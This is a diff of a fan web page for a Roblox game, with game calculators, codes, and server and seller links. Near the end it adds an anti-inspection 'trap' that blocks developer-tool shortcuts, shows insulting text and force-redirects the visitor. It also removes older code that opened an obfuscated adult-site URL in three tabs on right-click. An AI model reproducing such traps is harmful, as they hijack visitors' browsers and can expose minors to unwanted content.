+                    <option value="30000000000">Hashira</option>
+                    <option value="150000000000">Hakaishin</option>
+                    <option value="450000000000">Otsutsuki</option>
+                    <option value="1350000000000">Pirate King</option>
+                    <option value="4050000000000">Kishin</option>
+                    <option value="12150000000000">Angel</option>
+                    <option value="60750000000000">Demon King</option>
+                    <option value="303700000000000">Ultra Instinct</option>
+                    <option value="1518000000000000">Upper Moon</option>
+                </select>
+                
+                <div class="stats-toggle-row">
+                    <span>x2 Yen Gamepass</span>
+                    <label class="stats-toggle">
+                        <input type="checkbox" id="x2" onchange="calculateCoins()">
+                        <span class="stats-slider"></span>
+                    </label>
+                </div>
+                
+                <label class="calc-label">Yen Multi</label>
+                <select id="nenMulti" class="stats-select" onchange="calculateCoins()">
+                    <option value="1">None (1x)</option>
+                    <option value="1.05">E (1.05x)</option>
+                    <option value="1.1">D (1.1x)</option>
+                    <option value="1.15">C (1.15x)</option>
+                    <option value="1.2">B (1.2x)</option>
+                    <option value="1.25">A (1.25x)</option>
+                </select>
+                
+                <label class="calc-label">Hero Multi</label>
+                <select id="heroMulti" class="stats-select" onchange="calculateCoins()">
+                    <option value="1">None (1x)</option>
+                    <option value="1.05">E (1.05x)</option>
+                    <option value="1.1">D (1.1x)</option>
+                    <option value="1.15">C (1.15x)</option>
+                    <option value="1.2">B (1.2x)</option>
+                    <option value="1.25">A (1.25x)</option>
+                    <option value="1.3">S (1.3x)</option>
+                </select>
+                
+                <label class="calc-label">Champ Yen Multi</label>
+                <input id="championYenMulti" class="stats-input" value="1" oninput="calculateCoins()">
+                
+                <label class="calc-label">Current Yen</label>
+                <input id="currentCoins" class="stats-input" placeholder="e.g. 500M">
+                
+                <label class="calc-label">Needed Yen</label>
+                <input id="neededCoins" class="stats-input" placeholder="e.g. 10B">
+                
+                <button class="calc-btn" onclick="calculateCoins()">Calculate Yen</button>
+                
+                <div id="baseYenDisplay" style="text-align:center; font-size:14px; color:#aaa; margin-top:10px;">Base Yen / Min: 5</div>
+                <div class="stats-result" id="yenPerMin">Yen / Min: 0</div>
+                <div class="stats-result" id="coinsResult">Time: 0d 0h 0m</div>
+            </div>
+            
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social" style="margin-top:20px">
+                <span>Go Back</span>
+            </button>
+        </div>
     </div>
 
+    <!-- RANKS PAGE -->
+    <div class="form-container" id="ranksPage">
+        <h1>Rank Requirements</h1>
+        <div class="social-buttons-container">
+            <label class="calc-label">Select Rank</label>
+            <select id="statRankSelect" class="stats-select"></select>
+            <div id="statRequirementsDisplay" style="margin-top:30px;"></div>
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social" style="margin-top:20px">
+                <span>Go Back</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- POWERS PAGE -->
+    <div class="form-container" id="powersPage">
+        <h1>Powers</h1>
+        <div class="social-buttons-container">
+            <label class="calc-label">Select Power Type</label>
+            <select id="powersSelect" class="stats-select" onchange="updatePowersDisplay()">
+                <option value="Strength">Strength</option>
+                <option value="Durability">Durability</option>
+                <option value="Chakra">Chakra</option>
+                <option value="Sword">Sword</option>
+                <option value="Speed">Speed</option>
+                <option value="Agility">Agility</option>
+            </select>
+            <div id="powersDisplay" style="margin-top:30px;"></div>
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social" style="margin-top:20px">
+                <span>Go Back</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- CHAMPIONS PAGE -->
+    <div class="form-container" id="championsPage">
+        <h1>Champion Database</h1>
+        <div class="social-buttons-container">
+            <!-- SEARCH BAR -->
+            <div class="search-container" style="margin-bottom: 20px;">
+                <input type="text" id="championSearch" class="stats-input" placeholder="Search champions by name..." 
+                       style="width: 100%; padding: 12px 15px; font-size: 14px;" 
+                       oninput="filterChampions()">
+                <div style="display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap;">
+                    <button onclick="filterByBoard(1)" class="filter-btn" style="background: #ff0000; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 12px;">Board 1</button>
+                    <button onclick="filterByBoard(2)" class="filter-btn" style="background: #0055ff; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 12px;">Board 2</button>
+                    <button onclick="filterByBoard(3)" class="filter-btn" style="background: #ffcc00; color: #000; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 12px;">Limited</button>
+                    <button onclick="clearFilters()" class="filter-btn" style="background: var(--ng); color: #000; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 12px;">Show All</button>
+                </div>
+            </div>
+            
+            <!-- CHAMPION GRID -->
+            <div id="championsDisplay"></div>
+            
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social" style="margin-top:20px">
+                <span>Go Back</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- CODES PAGE -->
+    <div class="form-container" id="codesPage">
+        <h1>Active Codes</h1>
+        <div class="social-buttons-container">
+            <div class="codes-grid" id="codesGrid"></div>
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social" style="margin-top:20px">
+                <span>Go Back</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- CREDITS PAGE -->
+    <div class="form-container" id="creditsPage">
+        <h1>Development Credits</h1>
+        <div class="social-buttons-container">
+            <div class="credits-grid">
+                <div class="credit-item">
+                    <div class="credit-role">Developer</div>
+                    <div class="credit-name">Kagesan21</div>
+                </div>
+                <div class="credit-item">
+                    <div class="credit-role">Ticks per stat</div>
+                    <div class="credit-name">Kagesan21</div>
+                </div>
+                <div class="credit-item">
+                    <div class="credit-role">Codes and Rewards</div>
+                    <div class="credit-name">Kagesan21</div>
+                </div>
+                <div class="credit-item">
+                    <div class="credit-role">Version</div>
+                    <div class="credit-name">-666</div>
+                </div>
+            </div>
+            <p style="text-align: center; margin-top: 30px; color: #aaa; font-size: 12px;">All stuff was made by Kagesan21.</p>
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social" style="margin-top:20px">
+                <span>Go Back</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- TRUSTED SELLER PAGE -->
     <div class="form-container" id="trustedSeller">
         <h1>Trusted Seller</h1>
         <div class="social-buttons-container">
@@ -244,59 +1236,66 @@
             <div class="section-label">Verified Merchants</div>
             
             <button onclick="_nav('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2NsYXJpMjMyNA==')" class="btn-social">
-                <span><i class="bi bi-patch-check-fill"></i> Bey Gonzales</span>
+                <span class="text-minecraft"><i class="bi bi-patch-check-fill"></i> Bey Gonzales</span>
                 <span class="status-dot">Certified</span>
             </button>
             
             <button onclick="_nav('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0NoaWNlLjA1MjUyNA==')" class="btn-social">
-                <span><i class="bi bi-patch-check-fill"></i> Samiel Elliot Vendari</span>
+                <span class="text-minecraft"><i class="bi bi-patch-check-fill"></i> Samiel Elliot Vendari</span>
                 <span class="status-dot">Certified</span>
             </button>
 
             <button onclick="_nav('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Blcm1hbGluay5waHA/c3RvcnlfZmJpZD1wZmJpZDA1WEVKb1N3dkpUbVU1QVFKTXludDJWOG1BZWRpZHBFS1BXSm91RDUza3pWTVZBN29oU2dwTmRrM1JrTnBpOVNObCZpZD02MTU4NDA5OTkwNzU0MA==')" class="btn-social">
-                <span><i class="bi bi-facebook"></i> Klay Main Page</span>
+                <span class="text-minecraft"><i class="bi bi-facebook"></i> Klay Main Page</span>
                 <span class="status-dot">Verified</span>
             </button>
             
             <button onclick="_nav('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Blcm1hbGluay5waHA/c3RvcnlfZmJpZD1wZmJpZDAydnNRYnNrOUJhZ21wUzh2Q3RoVXpYNG5RSkhZbmVINjdZR2hKSkZKYU1BNGRvZWhHbk1rWXJyWnZ1M3Bjb0x4NmwmaWQ9NjE1ODAzMjI4MjY0OTk=')" class="btn-social">
-                <span><i class="bi bi-facebook"></i> Klay Second Page</span>
+                <span class="text-minecraft"><i class="bi bi-facebook"></i> Klay Second Page</span>
                 <span class="status-dot">Verified</span>
             </button>
 
-            <button onclick="_nav('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3N0b3J5LnBocD9zdG9yeV9mYmlkPTEyMjIwNTMyMjQ5MDAwMzU5NSZpZD02MTU1MDEwNzg1MjAxMCZtaWJleHRpZD1xaTJPbWcmcmRpZD1xcWxCdjBQWjVJVnE5RWRj')" class="btn-social">
-                <span><i class="bi bi-facebook"></i> Samiel Elliot Vendari Page</span>
+            <button onclick="_nav('aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3N0b3J5LnBocD9zdG9yeV9mYlk9MTIyMjA1MzIyNDkwMDAzNTk1JmlkPTYxNTUwMTA3ODUyMDEwJm1pYmV4dGlkPXFpMk9tZyZyZGlkPXFxbEJ2MFBaNUlWcTlFZGM=')" class="btn-social">
+                <span class="text-minecraft"><i class="bi bi-facebook"></i> Samiel Elliot Vendari Page</span>
                 <span class="status-dot">Verified</span>
             </button>
             
-            <button onclick="_page('mainPage')" class="btn-social" style="margin-top:20px">
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social" style="margin-top:20px">
                 <span>Go Back</span>
             </button>
         </div>
     </div>
 
+    <!-- SERVER PAGE -->
     <div class="form-container" id="serverPage">
         <h1>Private Servers</h1>
         <div class="social-buttons-container">
             <button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPTExZmMzMTE3Yzc2NDFmNDc5N2Y3YzRkZWM1YzllZGVlJnR5cGU9U2VydmVy')" class="btn-social">
-                <i class="bi bi-controller"></i><span>Ixora Server 1</span><span class="status-dot">Online</span>
+                <i class="bi bi-controller"></i><span class="text-minecraft">Ixora Server 1</span><span class="status-dot">Online</span>
             </button>
             <button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPWQ1ZTVhYTU5NWZmMmIwNGVhZTM4YWRjZGFmNWYxNTYwJnR5cGU9U2VydmVy')" class="btn-social">
-                <i class="bi bi-controller"></i><span>Ixora Server 2</span><span class="status-dot">Online</span>
+                <i class="bi bi-controller"></i><span class="text-minecraft">Ixora Server 2</span><span class="status-dot">Online</span>
             </button>
             <button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPTc3OGFhY2M3ZmNjN2E0NDM5NjY5NjRiZDFmY2NjODNhJnR5cGU9U2VydmVy=')" class="btn-social">
-                <i class="bi bi-controller"></i><span>Ixora Server 3</span><span class="status-dot">Online</span>
+                <i class="bi bi-controller"></i><span class="text-minecraft">Ixora Server 3</span><span class="status-dot">Online</span>
             </button>
             <button onclick="_nav('aHR0cHM6Ly93d3cucm9ibG94LmNvbS9zaGFyZT9jb2RlPWVkYTJjMDI5MDYxYWI0NDU5N2ZjMDdiOGZhN2JmNTJlJnR5cGU9U2VydmVy')" class="btn-social">
-                <i class="bi bi-controller"></i><span>Ixora Server 4</span><span class="status-dot">Online</span>
+                <i class="bi bi-controller"></i><span class="text-minecraft">Ixora Server 4</span><span class="status-dot">Online</span>
             </button>
-            <button onclick="_page('mainPage')" class="btn-social"><span>Go Back</span></button>
+            <button onclick="showTab('mainPage', document.getElementById('mainTabBtn'))" class="btn-social"><span>Go Back</span></button>
         </div>
     </div>
 
-    <div class="form-container" id="codePage">
-        <h1>Active Codes</h1>
-        <div class="codes-grid" id="codesGrid"></div>
-        <button onclick="_page('mainPage')" class="btn-social" style="margin-top:20px"><span>Go Back</span></button>
+    <!-- TRAP SCREEN (Hidden by default) -->
+    <div class="trap-screen" id="trapScreen">
+        <h1>🚨 KUPAL! 🚨</h1>
+        <p>Bawal yan Boi! Inspect ka pa?</p>
+        <p>Bold pornhub diretso to boi! 😈</p>
+        <p>Kabahan ka na boi! in 10 seconds...</p>
+    </div>
+
+    <div class="bg-text-container">
+        <h1 class="bg-glow-text">IXORA</h1>
     </div>
 
     <canvas id="fireCanvas"></canvas>
@@ -304,9 +1303,111 @@
     <script>
         (function() {
             const d = document, s = i => d.getElementById(i), a = b => atob(b);
-            const _M = s('v1'), _N = s('v2'), _B = s('bgMusic'), _I = s('muteIcon'), _C = s('customCursor');
-            let _triggered = false;
+            const _M = s('v1'), _N = s('v2'), _B = s('bgMusic'), _I = s('muteIcon');
+            let trapActivated = false;
+            let trapEnabled = true;
 
+            // SIMPLE KEYBOARD SHORTCUT DETECTION ONLY
+            document.addEventListener('keydown', function(e) {
+                if (trapActivated || !trapEnabled) return;
+                
+                const key = e.key;
+                const code = e.keyCode || e.which;
+                const ctrl = e.ctrlKey;
+                const shift = e.shiftKey;
+                const alt = e.altKey;
+                
+                // SIMPLE CHECK - ONLY THESE KEYS TRIGGER TRAP
+                const isDevToolsShortcut = 
+                    // F12
+                    code === 123 ||
+                    // Ctrl+Shift+I
+                    (ctrl && shift && (code === 73 || key === 'I')) ||
+                    // Ctrl+Shift+J
+                    (ctrl && shift && (code === 74 || key === 'J')) ||
+                    // Ctrl+Shift+C
+                    (ctrl && shift && (code === 67 || key === 'C')) ||
+                    // Ctrl+Shift+O
+                    (ctrl && shift && (code === 79 || key === 'O')) || 
+                    (ctrl && shift && (code === 80 || key === 'P')) ||  
+                    (ctrl && shift && (code === 83 || key === 'S')) || 
+                    (ctrl && shift && (code === 70 || key === 'F')) || 
+                    (ctrl && shift && (code === 82 || key === 'R')) ||  
+                    (ctrl && shift && (code === 69 || key === 'E')) ||
+                    (ctrl && shift && (code === 77 || key === 'M')) ||
+                    (ctrl && alt && (code === 73 || key === 'I')) ||
+                    (ctrl && alt && (code === 74 || key === 'J')) ||
+                    (ctrl && alt && (code === 67 || key === 'C')) ||
+                    (ctrl && shift && (code === 75 || key === 'K')) ||
+                    (ctrl && shift && (code === 81 || key === 'Q')) ||
+                    (alt && shift && (code === 73 || key === 'I')) ||
+                    (code === 119) ||
+                    (code === 121) ||
+                    (code === 122) ||
+                    (ctrl && (code === 192 || key === '`' || key === '~')) ||     
+                    (ctrl && (code === 219 || key === '[' || key === '{')) ||    
+                    (ctrl && (code === 221 || key === ']' || key === '}')) ||     
+                    (ctrl && (code === 187 || key === '=' || key === '+')) ||     
+                    (ctrl && (code === 189 || key === '-' || key === '_')) ||     
+                    (ctrl && (code === 48 || key === '0')) ||                     
+                    (code === 93) ||                                              
+                    (ctrl && shift && alt && (code === 73 || key === 'I')) ||     
+                    (ctrl && shift && alt && (code === 74 || key === 'J')) ||     
+                    (ctrl && shift && alt && (code === 67 || key === 'C')) ||     
+                    (ctrl && shift && code >= 65 && code <= 90) ||                
+                    (ctrl && alt && code >= 65 && code <= 90) || 
+                    // Ctrl+U
+                    (ctrl && (code === 85 || key === 'U'));
+                    
+                
+                if (isDevToolsShortcut) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    triggerTrap();
+                }
+            });
+            
+            // SIMPLE TRAP FUNCTION
+            function triggerTrap() {
+                if (trapActivated) return;
+                
+                trapActivated = true;
+                
+                // Show trap screen
+                s('trapScreen').style.display = 'flex';
+                
+                // Play trap sound
+                if (_M) {
+                    _M.loop = true;
+                    _M.play().catch(() => {});
+                }
+                
+                // Stop background music
+                if (_B) _B.pause();
+                
+                // Hide all content
+                d.querySelectorAll('.form-container, .tab-bar, .bg-text-container, .mute-toggle').forEach(el => {
+                    el.style.display = 'none';
+                });
+                
+                // Countdown and redirect
+                let seconds = 10;
+                const countdown = setInterval(() => {
+                    s('trapScreen').innerHTML = `
+                        <h1>🚨 KUPAL! 🚨</h1>
+                        <p>Bawal yan Boi! Inspect ka pa?</p>
+                        <p>Bold pornhub diretso to boi! 😈</p>
+                        <p>Kabahan ka na boi! in ${seconds} seconds...</p>
+                    `;
+                    seconds--;
+                    
+                    if (seconds < 0) {
+                        clearInterval(countdown);
+                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+                    }
+                }, 1000);
+            }
+            
             // Discord Counters
             const _0xG = '1459499481081839783', _0xG2 = '1280472944392536088'; 
             async function _upd() {
@@ -322,50 +1423,433 @@
             }
             _upd(); setInterval(_upd, 60000);
 
-            // Cursor
-            d.addEventListener('mousemove', e => { _C.style.left = e.clientX + 'px'; _C.style.top = e.clientY + 'px'; });
-
-            // Trap Logic
-            const _L = () => {
-                if (_triggered) return; _triggered = true; 
-                _C.style.display = 'none';
-                let e = d.createElement('div');
-                e.className = 'trap-screen';
-                e.innerHTML = `<h1>KUPAL</h1><p>Naghahanap ka ba ng codes? Kupal ka ba boi? 🤡🔥</p>`;
-                d.body.appendChild(e);
-                e.style.display = 'flex'; 
-                _B.pause(); _M.loop = true; _M.play().catch(() => {});
-                setTimeout(() => { for (let i = 0; i < 3; i++) window.open(a('aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20v'), '_blank'); }, 2000);
-            };
-            d.addEventListener('contextmenu', e => { e.preventDefault(); _L(); });
-
             // Codes
-            const activeCodes = ["150KLIKES","KURAMANEXTWEEK","25MVisits","125KLIKES","50KFAVORITES","BUGSPATCH1","BUGSPATCH2","BUGSPATCH3","BUGSPATCH4","UPDATETHISWEEKEND","100KLIKES","NEWCHIKARACODE","75KLIKES","ALMOST100KKLIKES","MOREYEN","MORECHIKARA","HappyNewYear","50kLikes","10MVisits","NewBloodlines","15kLikes","25kLikes","30kLikes","MinorBugs","BadActors","JanuaryIncident","Krampus","SecretCode","ChristmasTime","10kLikes","1MVisits","ChristmasDelay","Gullible67","FreeChikara3","FreeChikara2","FreeChikara","YenCode","WednesdayYenCode","WednesdayBoostsCode","ThursdayYenNewCode","ThursdayBoostsNewCode","KuramaUpdateSoon","NewFridayYenCode","NewFridayBoostsCode","175KLIKES","200KLIKES","SMALLCHIKARACODE","BIGCHIKARACODE","FIGHTINGPASS","KURAMAUPDATE"];
+            const activeCodes = ["150KLIKES","KURAMANEXTWEEK","25MVisits","125KLIKES","50KFAVORITES","BUGSPATCH1","BUGSPATCH2","BUGSPATCH3","BUGSPATCH4","UPDATETHISWEEKEND","100KLIKES","NEWCHIKARACODE","75KLIKES","ALMOST100KKLIKES","MOREYEN","MORECHIKARA","HappyNewYear","50kLikes","10MVisits","NewBloodlines","15kLikes","25kLikes","30kLikes","MinorBugs","BadActors","JanuaryIncident","Krampus","SecretCode","ChristmasTime","10kLikes","1MVisits","ChristmasDelay","Gullible67","FreeChikara3","FreeChikara2","FreeChikara","YenCode","WednesdayYenCode","WednesdayBoostsCode","ThursdayYenNewCode","ThursdayBoostsNewCode","KuramaUpdateSoon","NewFridayYenCode","NewFridayBoostsCode","175KLIKES","200KLIKES","SMALLCHIKARACODE","BIGCHIKARACODE","FIGHTINGPASS","KURAMAUPDATE","SATURDAYBUGSPATCH"];
             const g = s('codesGrid');
-            activeCodes.forEach(v => {
-                const k = d.createElement('button'); k.className = 'btn-social btn-copy';
-                k.innerHTML = `<span>${v}</span> <i class="bi bi-copy"></i>`;
-                k.onclick = () => {
-                    navigator.clipboard.writeText(v); _N.currentTime = 0; _N.play();
-                    k.innerHTML = 'COPIED!'; setTimeout(() => k.innerHTML = `<span>${v}</span> <i class="bi bi-copy"></i>`, 1000);
-                };
-                g.appendChild(k);
-            });
+            if (g) {
+                activeCodes.forEach(v => {
+                    const k = d.createElement('button'); k.className = 'btn-social btn-copy';
+                    k.innerHTML = `<span>${v}</span> <i class="bi bi-copy"></i>`;
+                    k.onclick = () => {
+                        navigator.clipboard.writeText(v); _N.currentTime = 0; _N.play();
+                        k.innerHTML = 'COPIED!'; setTimeout(() => k.innerHTML = `<span>${v}</span> <i class="bi bi-copy"></i>`, 1000);
+                    };
+                    g.appendChild(k);
+                });
+            }
 
             // UI
             s('startBtn').onclick = () => {
                 s('loader').style.opacity = '0';
-                setTimeout(() => { s('loader').style.visibility = 'hidden'; _B.play(); _I.className = 'bi bi-volume-up-fill'; }, 600);
+                setTimeout(() => { 
+                    s('loader').style.visibility = 'hidden'; 
+                    if (_B) _B.play(); 
+                    if (_I) _I.className = 'bi bi-volume-up-fill'; 
+                    // Enable trap after page loads
+                    trapEnabled = true;
+                }, 600);
             };
+            
             s('muteBtn').onclick = () => {
-                _B.paused ? (_B.play(), _I.className = 'bi bi-volume-up-fill') : (_B.pause(), _I.className = 'bi bi-volume-mute-fill');
+                if (!trapActivated) {
+                    if (_B.paused) {
+                        _B.play(); 
+                        if (_I) _I.className = 'bi bi-volume-up-fill';
+                    } else {
+                        _B.pause(); 
+                        if (_I) _I.className = 'bi bi-volume-mute-fill';
+                    }
+                }
             };
-            window._page = p => {
+            
+            // Tab Navigation
+            window.showTab = function(tabId, btn) {
+                if (trapActivated) return;
+                
+                // Hide all form containers
                 d.querySelectorAll('.form-container').forEach(c => c.classList.remove('active'));
-                s(p).classList.add('active');
+                
+                // Remove active class from all tab buttons
+                d.querySelectorAll('.tab-bar button').forEach(b => b.classList.remove('active'));
+                
+                // Show selected tab
+                s(tabId).classList.add('active');
+                
+                // Add active class to clicked button
+                if (btn) btn.classList.add('active');
+                
+                // Initialize content if needed
+                if (tabId === 'ranksPage') initRanks();
+                if (tabId === 'powersPage') updatePowersDisplay();
+                if (tabId === 'championsPage') initChamps();
             };
-            window._nav = l => { window.open(a(l), '_blank'); };
+            
+            window._nav = l => { 
+                if (!trapActivated) {
+                    window.open(a(l), '_blank'); 
+                }
+            };
+            
+            window._page = p => { 
+                if (!trapActivated) {
+                    showTab(p, null); 
+                }
+            };
 
+            // STAT CALCULATOR LOGIC
+            const ticksPerStat = { 
+                Strength: { AFK: 42, Clicking: 52 }, 
+                Durability: { AFK: 32, Clicking: 32 }, 
+                Chakra: { AFK: 22, Clicking: 25 }, 
+                Sword: { AFK: 42, Clicking: 48 } 
+            };
+            
+            // RANK DATA
+            const rankData = {
+                Fighter: { cost: '0', Strength: '0', Durability: '0', Chakra: '0', Sword: '0' },
+                Shinobi: { cost: '100', Strength: '1K', Durability: '1K', Chakra: '1K', Sword: '0' },
+                Pirate: { cost: '400', Strength: '0', Durability: '10K', Chakra: '10K', Sword: '10K' },
+                Ghoul: { cost: '1.5K', Strength: '100K', Durability: '100K', Chakra: '100K', Sword: '0' },
+                Hero: { cost: '5K', Strength: '1M', Durability: '1M', Chakra: '1M', Sword: '0' },
+                Reaper: { cost: '25K', Strength: '0', Durability: '10M', Chakra: '10M', Sword: '10M' },
+                Saiyan: { cost: '100K', Strength: '1B', Durability: '1B', Chakra: '1B', Sword: '0' },
+                Sin: { cost: '250K', Strength: '100B', Durability: '100B', Chakra: '100B', Sword: '0' },
+                Magi: { cost: '1M', Strength: '1T', Durability: '1T', Chakra: '1T', Sword: '0' },
+                Akuma: { cost: '5M', Strength: '100T', Durability: '100T', Chakra: '100T', Sword: '0' },
+                Yonko: { cost: '24.75M', Strength: '1QD', Durability: '1QD', Chakra: '1QD', Sword: '0' },
+                Gorosei: { cost: '62M', Strength: '100QD', Durability: '100QD', Chakra: '100QD', Sword: '0' },
+                Overlord: { cost: '165M', Strength: '1QN', Durability: '1QN', Chakra: '1QN', Sword: '0' },
+                Hokage: { cost: '540M', Strength: '100QN', Durability: '100QN', Chakra: '100QN', Sword: '0' },
+                Kaioshin: { cost: '3.4875B', Strength: '1SX', Durability: '1SX', Chakra: '1SX', Sword: '0' },
+                Sage: { cost: '12B', Strength: '100SX', Durability: '100SX', Chakra: '100SX', Sword: '0' },
+                Espada: { cost: '82.5B', Strength: '1SP', Durability: '1SP', Chakra: '1SP', Sword: '0' },
+                Shinigami: { cost: '1T', Strength: '100SP', Durability: '100SP', Chakra: '100SP', Sword: '0' },
+                Hashira: { cost: '6T', Strength: '1OC', Durability: '1OC', Chakra: '1OC', Sword: '0' },
+                Hakaishin: { cost: '367.2T', Strength: '100OC', Durability: '100OC', Chakra: '100OC', Sword: '0' },
+                Otsutsuki: { cost: '1.101Qd', Strength: '1N', Durability: '1N', Chakra: '1N', Sword: '0' },
+                "Pirate King": { cost: '2.592Qd', Strength: '100N', Durability: '100N', Chakra: '100N', Sword: '0' },
+                Kishin: { cost: '6.48Qd', Strength: '1DE', Durability: '1DE', Chakra: '1DE', Sword: '0' },
+                Angel: { cost: '19.44Qd', Strength: '100DE', Durability: '100DE', Chakra: '100DE', Sword: '0' },
+                "Demon King": { cost: '77.76Qd', Strength: '1UD', Durability: '1UD', Chakra: '1UD', Sword: '0' },
+                "Ultra Instinct": { cost: '311Qd', Strength: '100UD', Durability: '100UD', Chakra: '100UD', Sword: '0' },
+                "Upper Moon": { cost: '1.244Qn', Strength: '100DD', Durability: '100DD', Chakra: '100DD', Sword: '0' }
+            };
+            
+            // POWER DATA
+            const powerData = { 
+                Strength: [
+                    {name: "Rapid Punch", val: "Launch a series of continuous punches | 1x/tick (Uncountable) | 20s CD |"},
+                    {name: "Serious Punch", val: "Throw an incredibly powerful punch that deals a large amount of damage. | 10x | 25s CD |"},
+                    {name: "Tornado Smash", val: "Smash the ground with immense strength, dealing damage to a large area. | 10 | 20s CD |"},
+                    {name: "Vibration Wave", val: "Create an intense vibration that damages anyone in the way. | 13x | 20s CD |"}
+                ],
+                Durability: [
+                    {name: "Kings Aura", val: "Cover's player's entire body in a mysterious power which reduces 10% of player damage taken by attacks. | N/A | 10s CD |"},
+                    {name: "Super Human", val: "Transform into Super Human mode reducing 15% of all player damage taken | N/A | 10s CD | "},
+                    {name: "Armored Colossus", val: " Transform into an Armored Titan reducing 30% of all player damage taken and 4x punch damage for 30 seconds| N/A | 60s CD |"},
+                    {name: "Stage Four", val: "Transform into Stage Four which reduces 35% of all player damage taken. By punching, you can activate the forms melee ability.| N/A | 10s CD |"},
+                    {name: "Nine Tailed Mode", val: "Transform into Six Path Sage Mode and endure 40% damage received of all players MOST REQUIRED FOR PVP & PVE| N/A | 10s CD |"}
+                ],
+                Chakra: [
+                    {name: "Spiral Sphere", val: "Create a deadly ball of wind that blasts enemies backwards | 8x | 10s CD |"},
+                    {name: "Fire Fist", val: "A projectile that tracks down the closest player | 10x | 15s CD |"},
+                    {name: "Energy Beam", val: "Generate a deadly beam of energy that deals continuous damage| 6x/tick | 20s CD |"},
+                    {name: "Skeleton", val: "Form a large skeleton around your character, reducing 20% of all player damage taken. By punching, you can activate the skeleton's melee ability | N/A | 10s CD | "},
+                    {name: "Ice Blast", val: "Blast ice in front of you freezing players and dealing damage. | 8x scaling | 20s CD |"},
+                    {name: "Spirit Explosion", val: "Form a huge energy ball and casting is to long. Not required for PVP | 15x scaling | 9s CD |"},
+                    {name: "Spiral Shuriken", val: "Form a shuriken deals massive dmg and huge AoE. required for PVP & PVE | 25x scaling | 6-7s CD |"},
+                    {name: "Multiple Bomb Spiral Shuriken", val: "Form a multiple shuriken deals massive dmg and huge AoE. required for PVP & PVE | 20x scaling | 8s CD |"},
+                    {name: "Tail Monster Bomb", val: "Form a massive bomb deals massive dmg and huge AoE. required for PVP & PVE | 50x scaling | 3-5s CD |"},
+                ],
+                Sword: [
+                    {name: "Flying Slash", val: "Create a powerful slash of wind that flies towards enemies | 10x scaling | 10s CD |"},
+                    {name: "Rapid Slash", val: "Multiple slashes that deal continuous damage all players within range. | 8x/tick | 20s CD | "},
+                    {name: "Dragon's Wrath", val: "A powerful charge attack that can cut through multiple enemies| 15x scaling | 25s CD |"}
+                ], 
+                Speed: [
+                    {name: "Water Running", val: "Allows players to walk and run on water. | N/A | N/A |"}
+                ], 
+                Agility: [
+                    {name: "Flight", val: "Allows players to fly. | N/A | N/A | "},
+                    {name: "Flame Flight", val: "Generates fire under player's hands that allows faster flight. | N/A | "},
+                    {name: "Blink", val: "Teleport in any direction within an area. | N/A | 5s CD |"}
+                ] 
+            };
+            
+            // CHAMPIONS DATA
+            const championsData = [
+                { name: "Sanji", chance: "13.46%", cost: "1000 Shards", board: 1, desc: "Auto trains 40% of your Agility multiplier every 4 seconds and buffs Punch damage by 40%" },
+                { name: "Levi", chance: "12.39%", cost: "1250 Shards", board: 1, desc: "Auto trains 30% of your sword multiplier every 4 seconds" },
+                { name: "Killua", chance: "11.75%", cost: "1250 Shards", board: 1, desc: "Auto trains 45% of your Speed multiplier every 4 seconds and nerf Strength damage by 10%" },
+                { name: "Sakura", chance: "9.61%", cost: "1500 Shards", board: 1, desc: "Auto trains 20% of your Chakra every 4 seconds and heals 3% of your health every 5 seconds" },
+                { name: "Picollo", chance: "8.54%", cost: "2000 Shards", board: 1, desc: "Auto traind 20% of your Durability and Strength multiplier every 4 seconds." },
+                { name: "Toji", chance: "6.41%", cost: "2000 Shards", board: 1, desc: "Auto trains 34% of your Strength and Durability multiplier every 4 seconds" },
+                { name: "Kaneki", chance: "5.12%%", cost: "2250 Shards", board: 1, desc: "Auto trains 30% of your Strength multiplier every 4 seconds. Specially buffs Kagune damage by 15% and nerfs incoming Kagune damage by 20%" },
+                { name: "Luffy", chance: "4.7%", cost: "3000 Shards", board: 1, desc: "Auto trains 40% of your Agility and 35% Strength multiplier every 4 seconds. Specially buffs Fruit damage by 25% and nerfs incomming Fruit damage by 20%" },
+                { name: "Asta", chance: "4.48%", cost: "7500 Shards", board: 1, desc: "Auto trains 45% of your sword multiplier every 4 seconds. Specially buffs Grimoire damage by 25% nerfs incomming Grimoire damage by 20%. Also nerfs and buffs Sword Slash damage by 20%" },		
+                { name: "Jinwoo", chance: "4.06%", cost: "7500 Shards", board: 1, desc: "Auto trains 40% of your strength multiplier every 4 seconds. Specially buffs Quark damage by 25% nerfs incomming Quark damage by 20%" },
